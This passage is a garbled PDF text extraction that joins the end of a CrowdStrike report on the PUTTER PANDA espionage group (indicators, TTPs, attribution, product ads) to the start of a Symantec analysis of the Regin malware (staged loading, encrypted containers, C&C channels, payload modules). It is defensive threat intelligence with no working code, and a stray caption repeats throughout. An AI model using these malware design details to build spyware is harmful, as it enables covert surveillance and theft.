pointer is not properly zeroed or cleansed before use, leading to uncontrolled memory being read as other strings.
                                                                                                                                      35
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       Figure 15. 
                                       vitation_Pleia-
                                       des_012012.doc
                                       Dropped by a4e4b-
                                       3ceb949e8494968c-
                                       71fa840a516
                                              Screenshot of Truecaller
                                              Database Shared by
                                              DEADEYE JACKAL on Their
                                              Twitter Account (names
                                              redacted)
               Figure 16. 
Bien-
               venue_a_Sahaja_
               Yoga_Toulouse.doc
               Dropped by
               4c50457c35e-
               2033b3a03fcbb4ad-
               ac7b7
                                                                         36
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                        Figure 17. 
50th AIAA
                                        Satellite Sciences
                                        Conference.pdf
                                        from 6022cf1f-
                                        cf2b478bed8da1fa3e-
                                        996ac5
                                               Screenshot of Truecaller
                                               Database Shared by
                                               DEADEYE JACKAL on Their
                                               Twitter Account (names
                                               redacted)
              Figure 18: 
Proj-
              ect-Manager-Job-
              Description-Sur-
              rey-Satellite-Tech-
              nology-world-lead-
              er-provision-small-sat-
              ellite-solutions.
              pdf
 Dropped by
              9cb6103e9588d506cf-
              d81961ed41eefe
                                                                          37
Mitigation & Remediation
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
MITIGATION & REMEDIATION
A number of specific and generic
detection methods are possible for
this RAT, both on a host and on the
network. These are detailed below,
and are designed to expand upon
the indicators reported in other
CrowdStrike reporting.                                                              Screenshot of Truecaller
                                                                                    Database Shared by
                                                                                    DEADEYE JACKAL on Their
REGISTRY ARTIFACTS                                                             Twitter Account (names
The following Windows registry artifacts are indicative of a compromised host: redacted)
 ASEP registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run, and value named McUpdate
FILE SYSTEM ARTIFACTS
The presence of the following file system artifacts is indicative of a compromised host:
 ssdpsvc.dll, msacem.dll, or mrpmsg.dll
 C:\RECYCLER\restore.dat
 %TEMP%\index.dat
HOST INDICATORS
A file mapping named &*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf also indicates the victim machine is
compromised with PUTTER PANDA malware.
                                                                                                               39
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Yara Rules
                                       40
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       41
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       42
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       43
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
NETWORK SIGNATURES
In addition the domains listed in the Appendices and in the Attribution section, the generic signatures below
can be used to detect activity from the malware described in this report.
Snort Rules
                                                                                  Screenshot of Truecaller
                                                                                  Database Shared by
                                                                                  DEADEYE JACKAL on Their
                                                                                  Twitter Account (names
                                                                                  redacted)
                                                                                                                44
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       Screenshot of Truecaller
                                       Database Shared by
                                       DEADEYE JACKAL on Their
                                       Twitter Account (names
                                       redacted)
                                                                  45
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
TTPS
In addition to the indicators described above, PUTTER PANDA have some distinct generic TTPs:
 Distinctive connectivity checks to www.google.com
 Use of the HashData API to derive key material for authentication and encryption
 Use of the ASEP registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 Deployment of space industry-themed decoy documents during malware installations
                                                                                Screenshot of Truecaller
                                                                                Database Shared by
                                                                                DEADEYE JACKAL on Their
                                                                                Twitter Account (names
                                                                                redacted)
                                                                                                           46
Conclusion
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Conclusion
PUTTER PANDA are a determined adversary group who have been operating
for several years, conducting intelligence-gathering operations with a
significant focus on the space sector. Although some of their tools are
simplistic, taken as a whole their toolset provides a wide degree of control
over a victim system and can provide the opportunity to deploy additional
tools at will.
Research presented in this report shows that the PUTTER PANDA operators are
likely members of the 12th Bureau, 3rd General Staff Department
                                                          Screenshot(GSD)       of
                                                                     of Truecaller
                                                                 Database Shared by
the People
s Liberation Army (PLA), operating from the unit
s headquarters
                                                          DEADEYE JACKAL on Their
                                                           Twitter Account (names
in Shanghai with MUCD 61486. Strategic objectives for this unit    are likely
                                                                 redacted)
to include obtaining intellectual property and industrial secrets relating to
defense technology, particularly those to help enable the unit
s suspect
mission to conduct space surveillance, remote sensing, and interception of
satellite communications. PUTTER PANDA is likely to continue to aggressively
target Western entities that hold valuable information or intellectual property
relevant to these interests.
The detection and mitigation guidance given in this report will help to
minimize the risk of a successful compromise by these actors, and future
CrowdStrike reports will examine other elements of the PUTTER PANDA toolset.
                                                                                      48
Appendices
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 1: 4H RAT SAMPLE METADATA
                                       Screenshot of Truecaller
                                       Database Shared by
                                       DEADEYE JACKAL on Their
                                       Twitter Account (names
                                       redacted)
                                                                  50
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       51
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       52
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 2: 3PARA RAT SAMPLE METADATA
                                        Screenshot of Truecaller
                                        Database Shared by
                                        DEADEYE JACKAL on Their
                                        Twitter Account (names
                                        redacted)
                                                                   53
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 3: PNGDOWNER SAMPLE METADATA
                                       Screenshot of Truecaller
                                       Database Shared by
                                       DEADEYE JACKAL on Their
                                       Twitter Account (names
                                       redacted)
                                                                  54
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       Screenshot of Truecaller
                                       Database Shared by
                                       DEADEYE JACKAL on Their
                                       Twitter Account (names
                                       redacted)
                                                                  55
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       56
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 4: HTTPCLIENT SAMPLE METADATA
                                         Screenshot of Truecaller
                                         Database Shared by
                                         DEADEYE JACKAL on Their
                                         Twitter Account (names
                                         redacted)
                                                                    57
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CrowdStrike
Falcon                                                      Falcon
Intelligence                                                Intelligence
CrowdStrike Falcon Intelligence portal provides             Benefits
enterprises with strategic, customized, and actionable
intelligence. Falcon Intelligence enables organizations     Incorporate Actionable Intelligence
to prioritize resources by determining targeted             Feeds into your existing enterprise
versus commodity attacks, saving time and focusing          security infrastructure to identify
resources on critical threats. With unprecedented           advanced attackers speci!c to your
insight into adversary tools, tactics, and procedures       organization and industry
(TTPs) and multi-source information channels, analysts
can identify pending attacks and automatically feed         Rapidly integrate Falcon Intelligence
threat intelligence via API to SIEM and thirdparty
                                                            into custom work
ows and SEIM
                                                            deployments with a web-based API
security tools.
                                                            Quickly understand the capabilities
Access to CrowdStrike Falcon Intelligence is geared
                                                            and artifacts of targeted attacker
toward all levels of an organization, from the
                                                            tradecra# with In-depth technical
executivewho needs to understand the business threat
                                                            analysis
and strategic business impact, to the front-line securiyt
professional struggling to !ght through an adversary
                                                            Gain visibility into breaking events
attack against the enterprise.
                                                            that matter to an organization
                                                            brand, infrastructure, and customers
CrowdStrike Falcon Intelligence is a web-based              Interact with the Intelligence team
intelligence subscription that includes full access to a    and leverage customized Cyber
variety of feature sets, including:                         Threat Intelligence feedback during
Detailed technical and strategic analysis of             Quarterly Executive Brie!ngs
  50+adversaries
 capabilities, indicators and              Provide malware samples and
  tradecra!,attribution, and intentions                     receive customized and actionable
                                                            intelligence reporting
Customizable feeds and API for indicators of
  compromise in a wide variety of formats                   Access the Adversary Pro!le Library
                                                            to gain in-depth information into
Tailored Intelligence that provides                      50+ adversary groups, to include
  visibility into breaking events that matter to            capabilities and tradecra# and tradecraft
  an organization
s brand,
                                                                                                        58
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CrowdStrike Falcon Host                                  Falcon Host Key Features
                                                         
Endpoint threat detection and response solution
CrowdStrike Falcon Host is an endpoint threat
                                                         
Cloud-managed application with easily deployed sensors for
detection and response product that identifies
                                                          Mac & Windows
unknown malware, detects zero-day threats, and
                                                         
Kernel-mode sensors requires no reboot on updates. Less
prevents damage from targeted attacks in real-time.
                                                          than 2MB footprint executable
Falcon Host is comprised of two core components,
                                                         
Detects attacks based on adversary activity
the cloud-based management console and the
                                                         
Integrates with existing security architecture and SIEM tools
on-premises host-based sensor that continuously
                                                          through Falcon Host APIs
monitors threat activity at the endpoint to prevent
damage in real-time.
                                                         Technology Drivers:
                                                         Stateful Execution inspection
Falcon Host leverages a lightweight kernel-mode
                                                         Stateful Execution Inspection (SEI) tracks execution state and
sensor that shadows, captures, and correlates low-
                                                         links together various stages of the kill chain, from initial code
level operating system events to instantly identify
                                                         execution to data exfiltration.
the adversary tradecraft and activities through
Stateful Execution Inspection (SEI) at the endpoint
                                                         CrowdStrike
s Real-time Stateful Execution Engine performs
and Machine Learning in the cloud. As opposed
                                                         inspection and analysis to understand the full context of a
to focusing on malware signatures, indicators of
                                                         cyber attack. SEI is critical to understanding the entire
compromise, exploits, and vulnerabilities, Falcon Host
                                                         attack life cycle and preventing the damage from advanced
instead identifies mission objectives of the adversary
                                                         malware and targeted attacks. Existing security technologies
leveraging the Kill Chain model and provides realtime
                                                         that focus solely on malware signatures, incidators of
detection by focusing on what the attacker is
                                                         compromise, exploits, and vulnerabilities
doing, as opposed to looking nfor a specific,
                                                         fail to protect against the majority of attacks as they are blind
easily changeable indicator used in an attack.
                                                         to the full scope of adversary activity.
Without performing intrusive and performance-
                                                         Benefits
impacting scans of the system, Falcon Host
s highly
                                                         
Identify and protect against damage from determined
efficient real-time monitoring of all system activity
                                                           attackers who are undetected by existing passive
is the only security solution that provides maximum
                                                           defense solutions
visibility into all adversary activities, including
                                                         
Understand who is attacking you, why and what they want
Adversary-in-Motion: reconnaissance, exploitation,
                                                           to steal or damage
privilege escalation, lateral movement, and
                                                         
Alert and stop exfiltration of sensitive information from
exfiltration.
                                                           compromised machines Protect remote users when they
                                                           are outside of the corporate network
Falcon Host delivers insight into past and current
                                                         
Protect remote users when they are outside of the
attacks not only on a single host, but also across
                                                           corporate network
devices and networks.
                                                         
No on-premises equipment needed, reducing overall
                                                           total cost of ownership
                                                                                                                            59
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
About CrowdStrike
CrowdStrike is a global provider of security technology and services focused on
identifying advanced threats and targeted attacks. Using big-data technologies,
CrowdStrike
s next-generation threat protection platform leverages real-time
Stateful Execution Inspection (SEI) at the endpoint and Machine Learning
in the cloud instead of solely focusing on malware signatures, indicators of
compromise, exploits, and vulnerabilities. The CrowdStrike Falcon Platform
is a combination of big data technologies and endpoint security driven by
advanced threat intelligence. CrowdStrike Falcon enables enterprises to identify
unknown malware, detect zero-day threats, pinpoint advanced adversaries and
attribution, and prevent damage from targeted attacks in real time.
About CrowdStrike Services
CrowdStrike Services is a wholly owned subsidiary of CrowdStrike responsible
for proactively defending against and responding to cyber incidents with pre
and post Incident Response services. CrowdStrike
s seasoned team of Cyber
Intelligence professionals, Incident Responders, and Malware Researchers
consists of a number of internationally recognized authors, speakers, and experts
who have worked on some of the most publicized and challenging intrusions and
malware attacks in recent years. The CrowdStrike Services team leverages our
Security Operations Center to monitor the full CrowdStrike Falcon Platform and
provide cutting-edge advanced adversary intrusion detection services. The full
spectrum of proactive and response services helps customers respond tactically
as well as continually mature and strategically evolve Incident Response
program capabilities.
                                                                                  60
  For more information on the intelligence provided in this report or on
any of the 70+ actors tracked by the CrowdStrike Global Intelligence team,
               contact us at intelligence@crowdstrike.com
         To learn more about the CrowdStrike Falcon Platform or
       CrowdStrike Services, contact us at sales@crowdstrike.com.
                 www.crowdstrike.com | @CrowdStrike
SECURITY RESPONSE
Regin: Top-tier espionage tool
enables stealthy surveillance
Symantec Security Response
Version 1.0 
 November 24, 2014
      Regin is an extremely complex piece of software that can be
      customized with a wide range of different capabilities that
      can be deployed depending on the target.
CONTENTS
           OVERVIEW...................................................................... 3
           Introduction................................................................... 5
           Timeline.......................................................................... 5
           Target profile.................................................................. 6
               Infection vector........................................................ 6
           Architecture................................................................... 8
               Stage 0 (dropper)..................................................... 9
               Stage 1...................................................................... 9
               Stage 2...................................................................... 9
               Stage 3...................................................................... 9
               Stage 4............................................................ 
               Stage 5.................................................................... 11
               Encrypted virtual file system containers
               Command-and-control operations......................... 12
               Logging................................................................... 12
           Payloads....................................................................... 14
           64-bit version............................................................... 15
               File names.............................................................. 15
               Stage differences................................................... 15
           Conclusion.................................................................... 16
           Protection..................................................................... 16
           Appendix...................................................................... 18
               Data files................................................................ 18
           Indicators of compromise............................................ 20
               File MD5s................................................................ 20
               File names/paths.................................................... 20
               Extended attributes............................................... 21
               Registry.................................................................. 21
OVERVIEW
  In the world of malware threats, only a few rare examples can truly be considered
  groundbreaking and almost peerless. What we have seen in Regin is just such a class of
  malware.
  Regin is an extremely complex piece of software that can be customized with a wide
  range of different capabilities which can be deployed depending on the target. It is built
  on a framework that is designed to sustain long-term intelligence-gathering operations
  by remaining under the radar. It goes to extraordinary lengths to conceal itself and its
  activities on compromised computers. Its stealth combines many of the most advanced
  techniques that we have ever seen in use.
  The main purpose of Regin is intelligence gathering and it has been implicated in data
  collection operations against government organizations, infrastructure operators,
  businesses, academics, and private individuals. The level of sophistication and complexity
  of Regin suggests that the development of this threat could have taken well-resourced
  teams of developers many months or years to develop and maintain.
  Regin is a multi-staged, modular threat, meaning that it has a number of components,
  each depending on others, to perform attack operations. This modular approach gives
  flexibility to the threat operators as they can load custom features tailored to individual
  targets when required. Some custom payloads are very advanced and exhibit a high
  degree of expertise in specialist sectors. The modular design also makes analysis of the
  threat difficult, as all components must be available in order to fully understand it. This
  modular approach has been seen in other sophisticated malware families such as Flamer
  and Weevil (The Mask), while the multi-stage loading architecture is similar to that seen
  in the Duqu/Stuxnet family of threats.
  Regin is different to what are commonly referred to as 
traditional
 advanced persistent
  threats (APTs), both in its techniques and ultimate purpose. APTs typically seek specific
  information, usually intellectual property. Regin
s purpose is different. It is used for the
  collection of data and continuous monitoring of targeted organizations or individuals.
  This report provides a technical analysis of Regin based on a number of identified
  samples and components. This analysis illustrates Regin
s architecture and the many
  payloads at its disposal.
     INTRODUCTION
Regin has a wide
range of standard
capabilities,
particularly around
monitoring targets
and stealing data.
                                                          Regin: Top-tier espionage tool enables stealthy surveillance
Introduction
    Regin is a multi-purpose data collection tool which dates back several years. Symantec first began looking into
    this threat in the fall of 2013. Multiple versions of Regin were found in the wild, targeting several corporations,
    institutions, academics, and individuals.
    Regin has a wide range of standard capabilities, particularly around monitoring targets and stealing data. It also
    has the ability to load custom features tailored to individual targets. Some of Regin
s custom payloads point to a
    high level of specialist knowledge in particular sectors, such as telecoms infrastructure software, on the part of
    the developers.
    Regin is capable of installing a large number of additional payloads, some highly customized for the targeted
    computer. The threat
s standard capabilities include several remote access Trojan (RAT) features, such as
    capturing screenshots and taking control of the mouse
s point-and-click functions. Regin is also configured to
    steal passwords, monitor network traffic, and gather information on processes and memory utilization. It can
    also scan for deleted files on an infected computer and retrieve them. More advanced payload modules designed
    with specific goals in mind were also found in our investigations. For example, one module was designed to
    monitor network traffic to Microsoft Internet Information Services (IIS) web servers, another was designed
    to collect administration traffic for mobile telephony base station controllers, while another was created
    specifically for parsing mail from Exchange databases.
    Regin goes to some lengths to hide the data it is stealing. Valuable target data is often not written to disk. In
    some cases, Symantec was only able to retrieve the threat samples but not the files containing stolen data.
Timeline
    Symantec is aware of two distinct versions of Regin. Version 1.0 appears to have been used from at least 2008 to
    2011. Version 2.0 has been used from 2013 onwards, though it may have possibly been used earlier.
    Version 1.0 appears to have been abruptly withdrawn from circulation in 2011. Version 1.0 samples found after
    this date seem to have been improperly removed or were no longer accessible to the attackers for removal.
    This report is based primarily on our analysis of Regin version 1.0. We also touch on version 2.0, for which we
    only recovered 64-bit files.
    Symantec has assigned these version identifiers as they are the only two versions that have been acquired. Regin
    likely has more than two versions. There may be versions prior to 1.0 and versions between 1.0 and 2.0.
                                                          Page 5
                                                         Regin: Top-tier espionage tool enables stealthy surveillance
Target profile
    The Regin operators do not appear to
    focus on any specific industry sector.
    Regin infections have been observed
    in a variety of organizations,
    including private companies,
    government entities, and research
    institutes.
    Infections are also geographically
    diverse, having been identified
    mainly in 10 different regions.
  Infection vector
    The infection vector varies among
    targets. A reproducible infection
    vector is unconfirmed at time of
    writing. Targets may be tricked into
    visiting spoofed versions of well-
    known websites and the threat may
    be installed through a web browser
    or by exploiting an application. On
    one computer, log files show that
    Regin originated from Yahoo! Instant
    Messenger through an unconfirmed
    exploit.
                                             Figure 1. Confirmed Regin infections by sector
                                             Figure 2. Confirmed Regin infections by country
                                                         Page 6
ARCHITECTURE
               The initial Stage 1
               driver is the only
               plainly visible code
               on the computer.
               All other stages are
               stored as encrypted
               data blobs...
                                                          Regin: Top-tier espionage tool enables stealthy surveillance
Architecture
    Regin has a six-stage architecture. The initial        Table 1. The six stages of Regin
    stages involve the installation and configuration
    of the threat
s internal services. The later stages    Stages          Components
    bring Regin
s main payloads into play. This            Stage 0         Dropper. Installs Regin onto the target computer
    section presents a brief overview of the format
                                                           Stage 1         Loads driver
    and purpose of each stage. The most interesting
    stages are the executables and data files stored       Stage 2         Loads driver
    in Stages 4 and 5. The initial Stage 1 driver is       Stage 3         Loads compression, encryption, networking, and han-
    the only plainly visible code on the computer. All                     dling for an encrypted virtual file system (EVFS).
    other stages are stored as encrypted data blobs,
                                                           Stage 4         Utilizes the EVFS and loads additional kernel mode
    as a file or within a non-traditional file storage
                                                                           drivers, including payloads.
    area such as the registry, extended attributes, or
    raw sectors at the end of disk.                        Stage 5         Main payloads and data files
    Figure 3. Regin
s architecture
                                                          Page 8
                                                        Regin: Top-tier espionage tool enables stealthy surveillance
Stage 0 (dropper)
  Symantec Security Response has not obtained the Regin dropper at the time of writing. Symantec believes that
  once the dropper is executed on the target
s computer, it will install and execute Stage 1. It
s likely that Stage
  0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded
  versions of stages 2, 3, and potentially stages 4 and onwards. The dropper could be transient rather than acting
  as an executable file and may possibly be part of the infection vector exploit code.
Stage 1
  Stage 1 is the initial load point for the threat. There are two known Stage 1 file names:
 usbclass.sys (version 1.0)
 adpu160.sys (version 2.0)
  These are kernel drivers that load and execute Stage 2. These kernel drivers may be registered as a system
  service or may have an associated registry key to load the driver while the computer is starting up.
  Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes. If no extended attributes are
  found, Stage 2 is executed from a set of registry keys.
Stage 2
  Stage 2 is a kernel driver that simply extracts, installs and runs Stage 3. Stage 2 is not stored in the traditional
  file system, but is encrypted within an extended attribute or a registry key blob.
  Stage 2 can be found encrypted in:
  Extended attribute
 %Windir%
 %Windir%\fonts
 %Windir%\cursors (possibly only in version 2.0)
  Registry subkey
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605-9452-4787-B793-
     D0204917CA58}
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\RestoreList\VideoBase (possibly only in version
     2.0)
  This stage can also hide running instances of Stage 1. Once this happens, there are no remaining plainly visible
  code artifacts. Similar to previous stages, Stage 2 finds and loads an encrypted version of Stage 3 from either
  NTFS extended attributes or a registry key blob.
  Stage 2 can also monitor the state of the threat. This stage drops the file msrdc64.dat, which appears to always
  be 512 bytes in size. The first two bytes are used and the remaining bytes are set to zero. The second byte
  indicates the exclusive maximum number of instances allowed to run, which is set to two. This means no more
  than one instance should run at any time. The first byte indicates how many instances were run or attempted to
  run. Therefore, the potential combinations for the first two bytes are:
 00 02 (the threat is not running)
 01 02 (the threat is running)
 02 02 (the threat was running and a second instance has started).
Stage 3
  Stage 3 is a kernel mode DLL and is not stored in the traditional file system. Instead, this file is encrypted within
  an extended attribute or registry key blob.
                                                        Page 9
                                                      Regin: Top-tier espionage tool enables stealthy surveillance
Stage 3 can be found in the following locations:
Extended attribute
 %Windir%\system32
 %Windir%\system32\drivers
Registry subkey
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605-9452-4787-B793-
   D0204917CA5A}
The file is six to seven times the size of the driver in Stage 2. In addition to loading and executing Stage 4, Stage
3 offers a framework for the higher level stages.
Stages 3 and above are based on a modular framework of code modules. These modules offer functions through
a private, custom interface. Each file in stages 3 and above can 
export
 functionality to other parts of Regin.
In the case of Stage 3, the following primitives are offered:
 The orchestrator, which parses custom records found in the appended data of the executable files for stages
   3 and above. These records contain a list of Regin functionalities to be executed. A record starts with the
   number 0xD912FEAB (little-endian ordering)
 Compression and decompression routines
 Encryption and decryption routines
 Routines to retrieve storage locations of higher-level (Stage 4) components
 Routines to handle an encrypted virtual file system used by Stage 4
 Network primitives
These primitives are provided through a custom export methodology.
Export methodology
The Stage 3 DLL exports a wide range        Table 2. An example of Regin
s methods organized into 12 groups
of functionality through a custom
export methodology. The interface used       Major                           Functionality
to export functionality does not make        0001h                           Core
use of the traditional Windows DLL
                                             000Dh                           Compression, decompression
export mechanism by name or ordinal.
                                             000Fh                           Encryption, decryption
Exported Regin methods are referenced
                                             003Dh                           EVFS handling
by a tuple consisting of a major
and minor number. Stage 3 exports            0007h                           Container management
hundreds of methods, organized               000Bh                           Log management
into 12 different major groups. The
numbers used vary across versions. We        0033h                           Loader
acquired artifacts using two different       0011h                           Network
numbering schemes. Table 2 is an
example listing.                             0013h                           Network
                                             C373h                           TCP command-and-control (C&C)
With Regin
s modular nature, Stage
4 kernel modules and Stage 5 user            0019h                           UDP C&C
modules (payloads) can provide               0009h                           C&C Processor
functionality and export routines using
the same major and minor numbering
scheme.
                                                     Page 10
                                                        Regin: Top-tier espionage tool enables stealthy surveillance
Stage 4
  The files for Stage 4, which are loaded by Stage 3, consist of a user-mode orchestrator and multiple kernel
  payload modules. They are stored in two EVFS containers as files:
 %System%\config\SystemAudit.Evt: Contains Stage 4 kernel drivers, which constitute the kernel mode part of
     Regin
s payload.
 %System%\config\SecurityAudit.Evt: Contains a user mode version of Stage 3. The files are injected into
     services.exe.
  When the attackers who operated Regin cleaned up compromised computers once they were finished with them,
  they often failed to remove Stage 4 and 5 artifacts from the system.
  Stage 4 also uses the same export methodology described in Stage 3.
Stage 5
  Stage 5 consists of the main Regin payload functionality. The files for Stage 5 are injected into services.exe by
  Stage 4.
  Stage 5 files are EVFS containers containing other files:
 %System%\config\SystemLog.evt: Contains Stage 5 user mode DLLs. They constitute Regin
s payload.
 %System%\config\SecurityLog.evt: Contains Stage 5 data files, used by the Stage 4 and 5 components to
     store various data items
 %System%\config\ApplicationLog.evt: Another Stage 5 log container, which is
     referenced by Stage 5 data files
 %Windir%\ime\imesc5\dicts\pintlgbp.imd (version 2.0)
 %Windir%\ime\imesc5\dicts\pintlgbs.imd (version 2.0)
  Regin
s payload involves the DLLs contained in the SystemLog.evt EVFS container.
  The payload functionality differs depending on the targeted computer. Custom
  payload files will likely be delivered for each specific environment. Example payload
  functionality seen to date includes:
 Sniffing low-level network traffic
 Exfiltrating data through various channels (TCP, UDP, ICMP, HTTP)
 Gathering computer information
 Stealing passwords
 Gathering process and memory information
 Crawling through the file system
 Low level forensics capabilities (for example, retrieving files that were deleted)
 UI manipulation (remote mouse point & click activities, capturing screenshots, etc.)
 Enumerating IIS web servers and stealing logs
 Sniffing GSM BSC administration network traffic
Encrypted virtual file system containers
  Regin stores data files and payloads on disk in encrypted virtual file system files. Such
  files are accessed by the major routines 3Dh. Files stored inside EVFS containers are
  encrypted with a variant of RC5, using 64-bit blocks and 20 rounds. The encryption
  mode is reverse cipher feedback (CFB).
  Known extensions for EVFS containers are *.evt and *.imd. The structure of a
  container is similar to the FAT file system. One major difference is that files do          Figure 4. Physical layout
  not have a name; instead, they
re identified using a binary tag. The tag itself is the      of an EVFS container
                                                       Page 11
                                                           Regin: Top-tier espionage tool enables stealthy surveillance
  concatenation of a major number and a minor number. The major number typically indicates the major function
  group that will handle the file.
  A container starts with the header in Table 3
  (little-endian ordering).                              Table 3. The container
s header
                                                          Offset                Type       Description
  The header is followed by the file entry table
  (Table 4). Each file entry is 13h+taglen bytes          00h                   WORD       Sector size in bytes
  long.                                                   02h                   WORD       Maximum sector count
  The sectors follow (Table 5). A sector of               04h                   WORD       Maximum file count
  sectsize bytes starts with a DWORD pointing to          06h                   BYTE       File tag length (taglen)
  the next sector (if the file does not fit within a
  single sector), followed by sectsize-4 bytes of         07h                   DWORD      Header CRC
  payload data.                                           0Bh                   DWORD      File table CRC
  As explained above, the files are encrypted.            0Fh                   WORD       Number of files
  Other layers of encryption and compression              11h                   WORD       Number of sectors in use
  may also be in place, although those would be           13h                   -          Sector-use bitmap
  handled by higher level components.
Command-and-control                                      Table 4. The container
s file entry table
operations                                                Offset         Type           Description
                                                          00h            DWORD          CRC
  Regin
s C&C operations are extensive. These
  backchannel operations are bidirectional,        04h           DWORD          File offset
  which means either the attackers can initiate    08h           DWORD          Offset to first sector holding the file data
  communications with compromised computers
  on the border network or the compromised         0Ch           BYTE[taglen]   File tag
  computers can initiate communications with
  the attacker. Furthermore, compromised
  computers can serve as a proxy for other         Table 5. The container
s sectors
  infections and command and control can           Offset      Type                   Description
  also happen in a peer-to-peer fashion. All
                                                   00h         DWORD                  Next sector offset, or 0
  communications are strongly encrypted and
  can happen in a two-stage fashion where the      04h         BYTE[sectsize-4]       Data
  attacker may contact a compromised computer
  using one channel to instruct it to begin
  communications on a different channel. Four transport protocols are available for C&C:
 ICMP: Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data. The string
     
shit
 is scattered in the packet for data validation. In addition, CRC checks use the seed 
31337
 UDP: Raw UDP payload
 TCP: Raw TCP payload
 HTTP: Payload information can be encoded and embedded within cookie data under the names SESSID,
     SMSWAP, TW, WINKER, TIMESET, LASTVISIT, AST.NET_SessionId, PHPSESSID, or phpAds_d. This information
     can be combined with another cookie for validation under the names USERIDTK, UID, GRID, UID=PREF=ID, TM,
     __utma, LM, TMARK, VERSION, or CURRENT
  The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage
  5 payloads, such as C375h and 1Bh.
Logging
  Regin logs data to the ApplicationLog.dat file. This file is not an encrypted container, but it is encrypted and
  compressed.
                                                          Page 12
PAYLOADS
           The extensible
           nature of Regin and
           its custom payloads
           indicate that many
           payloads are likely
           to exist in order to
           enhance Regin
           capabilities...
                                                                Regin: Top-tier espionage tool enables stealthy surveillance
Payloads
    Regin can be distributed with various payload modules or receive payload modules after infection. The
    extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in
    order to enhance Regin
s capabilities. Furthermore, we have found data files accompanying payload modules
    that have not been recovered. The following table describes the Stage 4 kernel payload modules and Stage 5
    user mode payload modules, which we have seen several variants of Regin use.
    Table 6. Regin
s stage 4 kernel payload modules and stage 5 user mode payload modules
     File type Major       Description
     SYS       0003        Driver
     SYS       C433        Rootkit
     SYS       C42B        PE loader
     SYS       C42D        DLL injection
     SYS       C3C3        Network packet filter driver similar to the WinPCap (protocol filter version 3.5)
                           Used to set TCP and UDP pass-through filters and to bypass firewalls.
                           Executes BPF (Berkeley Packet Filter) bytecode, stored in Stage 5 data files.
     SYS       4E69        Network port blocker
     DLL       C363        Network packet capture
     DLL       4E3B        Retrieve proxy information for a web browser (Internet Explorer, Netscape, Firefox) through registry or configu-
                           ration files (for example, prefs.js, refs.js, etc.) Enumerate sessions and user accounts
     DLL       290B        Password stealer
                           
  Windows Explorer credentials
                           
  Windows Explorer pstore records
                           
  Internet Explorer LegacySettings
                           
  Data for a Winlogon notification package named 
cryptpp
     DLL       C375        C&C HTTP/cookies
     DLL       C383        SSL communications
     DLL       C361        Supporting cryptography functions
     DLL       001B        ICMP backchannel
     DLL       C399        Record builder for ApplicationLog.Evt
     DLL       C39F        Processes file: %Temp%\~b3y7f.tmp
     DLL       C3A1        Miscellaneous functions
     DLL       28A5        Miscellaneous functions
     DLL       C3C1        Miscellaneous functions
     DLL       C3B5        Gather system information
                           
  CPUMemory
                           
  Drives and shares
                           
  Devices
                           
  Windows information (including type, version, license info, owner info)
                           
  Installed software
                           
  Running processes (through HKEY_PERFORMANCE_DATA id 230)
                           
  Services
                           
  Schedules tasks and jobs
                           
  Running desktop sessions
                           
  User accounts information
                           
  System
s auditing rules/policy
                           
  System time and Windows install time
                                                               Page 14
                                                                Regin: Top-tier espionage tool enables stealthy surveillance
     DLL        C36B       UI manipulation
                           
   Capture screenshots
                           
   Log keystrokes
                           
   Lock the workstation/input Ctrl-Alt-Del
                           
   Click functionality (through three commands: go, click & release, return to original position)
                           
   End processes
     DLL        C351       File system exploration primitives and forensic level exploration including a raw NTFS parser
                           
    Get miscellaneous file information and properties
                           
    Browse directories
                           
    Read and write files
                           
    Move and copy files
                           
    Read and recover partially or fully deleted files
                           
    Compute file hashes
     DLL        2B5D       Process and module manipulation
                           
   Read processes and modules
                           
   Processes running times, quotas, privileges
                           
   Skip Russian or English Microsoft files when scanning
                           
   Check for newly introduced PE files in the last two days
     DLL        C3CD       Enumerate TCP/IP interfaces from %System%\CurrentControlSet\Services\Tcpip\Linkage\bind
     DLL        C38F       TCPDump utility
     DLL        C3C5       Libnet binary
     DLL        27E9       IIS web server log theft
                           Enumeration through COM objects to find IIS logs. Ability to retrieve partial or complete log information.
                           
   Partial: Log type, last log, older log timestamps
                           
   Complete: Entire log data is exfiltrated
    The IIS web server log stealing module, 27E9h, is an example of a payload module that was installed after the initial
    infection and was specifically deployed for a particular target.
64-bit version
    Only a small amount of the 64-bit Regin files have been recovered. These samples may represent version 2.0 or
    their differences may possibly be solely specific to 64-bit versions of Regin. We also recovered files from infected
